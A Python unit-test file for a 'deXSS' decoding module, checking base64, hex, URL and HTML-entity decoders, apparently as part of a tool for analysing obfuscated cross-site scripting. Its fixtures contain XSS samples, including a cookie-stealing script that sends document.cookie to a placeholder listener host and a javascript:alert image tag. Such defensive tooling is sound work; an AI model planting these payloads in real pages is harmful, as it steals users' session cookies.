import unittest
import deXSS
import binascii

class TestdeXSSFunctions(unittest.TestCase):
    
    def test_de_base64_decode(self):
        self.assertEqual(
            deXSS.de_base64_decode('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='), 
            'document.location="http://listernIP/"+document.cookie')

        self.assertEqual(
            deXSS.de_base64_decode('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU-'), 
            'document.location="http://listernIP/"+document.cookie')

        try:
            deXSS.de_base64_decode('document.location="http://listernIP/"+document.cookie')
            self.fail('None b64 string still decoded')
        except binascii.Error:
            pass

    def test_de_hex_decode(self):
        self.assertEqual(
            deXSS.de_hex_decode('48656c6c6f20576f726c6421'),
            'Hello World!'
        )

        try:
            deXSS.de_hex_decode('Not Hex')
            self.fail('None hex string still decoded')
        except ValueError:
            pass

    def test_de_url_decode(self):
        self.assertEqual(
            deXSS.de_url_decode('example.com?title=%D0%BF%D1%80%D0%B0%D0%B2%D0%BE%D0%B2%D0%B0%D1%8F+%D0%B7%D0%B0%D1%89%D0%B8%D1%82%D0%B0'),
            'example.com?title=правовая+защита'
        )

        self.assertEqual(
            deXSS.de_url_decode('%D0%BF%D1%80%D0%B0%D0%B2%D0%BE%D0%B2%D0%B0%D1%8F+%D0%B7%D0%B0%D1%89%D0%B8%D1%82%D0%B0'),
            'правовая+защита'
        )

        try:
            deXSS.de_url_decode('not url')
            self.fail('None url string still decoded')
        except ValueError:
            pass

    def test_de_html_decode(self):
        self.assertEqual(
            deXSS.de_html_decode('<IMG SRC=javascript:alert(&quot;XSS&quot;)>'),
            '<IMG SRC=javascript:alert("XSS")>'
        )


if __name__ == '__main__':
    unittest.main()